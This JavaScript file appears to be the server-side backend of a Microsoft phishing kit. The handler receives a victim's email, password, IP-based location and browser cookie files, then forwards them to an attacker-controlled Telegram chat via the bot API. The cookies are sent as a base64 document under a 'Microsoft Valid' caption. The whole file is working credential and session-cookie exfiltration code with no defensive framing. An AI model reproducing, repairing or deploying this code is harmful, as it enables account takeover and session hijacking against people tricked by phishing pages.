/**
 * FIXED: Proper base64 encoding for Telegram document
 */

const https = require('https');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function sendToTelegram(message, isDocument = false, docContent = null, docName = null) {
  return new Promise((resolve, reject) => {
    let postData;
    let path;

    if (isDocument && docContent) {
      // ✅ FIXED: Proper base64 encoding
      const contentStr = typeof docContent === 'string' ? docContent : JSON.stringify(docContent);
      const buffer = Buffer.from(contentStr, 'utf8');
      const base64 = buffer.toString('base64');

      console.log('📦 Base64 encoding:');
      console.log('  Original length:', contentStr.length);
      console.log('  Base64 length:', base64.length);
      console.log('  Base64 valid:', /^[A-Za-z0-9+/]*={0,2}$/.test(base64));

      postData = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        document: `data:text/plain;base64,${base64}`,
        caption: message,
        parse_mode: 'HTML'
      });
      path = `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
    } else {
      // Send as message
      postData = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      path = `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    }

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: path,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    console.log('📤 Sending to Telegram...');
    console.log('Path:', path);
    console.log('PostData length:', Buffer.byteLength(postData));

    const req = https.request(options, (res) => {
      let data = '';
      console.log('📥 Response status:', res.statusCode);

      res.on('data', chunk => {
        data += chunk;
      });

      res.on('end', () => {
        console.log('📥 Response:', data);

        try {
          const json = JSON.parse(data);
          if (res.statusCode === 200 && json.ok) {
            console.log('✅✅✅ TELEGRAM SUCCESS');
            resolve(json);
          } else {
            console.error('❌ Telegram rejected:', json);
            reject(new Error(json.description || 'Telegram error'));
          }
        } catch (e) {
          console.error('❌ Parse error:', e.message);
          reject(e);
        }
      });
    });

    req.on('error', (err) => {
      console.error('❌ HTTPS error:', err.message);
      reject(err);
    });

    req.on('timeout', () => {
      console.error('❌ Timeout');
      req.destroy();
      reject(new Error('Timeout'));
    });

    req.write(postData);
    req.end();
  });
}

exports.handler = async (event) => {
  console.log('🚀 Handler started at', new Date().toISOString());

  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Content-Type': 'application/json'
  };

  try {
    const payload = JSON.parse(event.body || '{}');
    const { email, password, locationData = {}, cookieFiles = {} } = payload;

    console.log('✅ Payload received');
    console.log('Email:', email);
    console.log('Has cookie content:', !!cookieFiles.jsonFile?.content);
    console.log('Cookie content length:', cookieFiles.jsonFile?.content?.length);

    // Build caption
    let caption = '<b>✅ Microsoft Valid</b>\n\n';
    caption += `👤:- ${email || 'N/A'}\n`;
    caption += `🔑:- ${password ? '***' : 'N/A'}\n`;

    if (locationData.ip) {
      caption += `\n🌍 Location:\n`;
      caption += `IP:- ${locationData.ip}\n`;
      if (locationData.city) caption += `City:- ${locationData.city}\n`;
      if (locationData.region) caption += `Region:- ${locationData.region}\n`;
      if (locationData.country) caption += `Country:- ${locationData.country}\n`;
    }

    caption += `\nBrowser:- chrome\n`;
    caption += `\n⏰ ${new Date().toISOString()}\n`;

    console.log('📝 Caption length:', caption.length);

    // Send to Telegram
    if (cookieFiles.jsonFile?.content) {
      console.log('🚀 Sending DOCUMENT...');
      await sendToTelegram(
        caption,
        true,
        cookieFiles.jsonFile.content,
        `${email}_${Date.now()}.txt`
      );
    } else {
      console.log('🚀 Sending MESSAGE...');
      await sendToTelegram(caption, false);
    }

    console.log('═══════════════════════════════════════════');
    console.log('✅✅✅ SUCCESS - Data sent to Telegram');
    console.log('═══════════════════════════════════════════');

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        transmitted: true
      })
    };

  } catch (error) {
    console.error('═══════════════════════════════════════════');
    console.error('❌ ERROR:', error.message);
    console.error('═══════════════════════════════════════════');

    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: error.message,
        success: false
      })
    };
  }
};
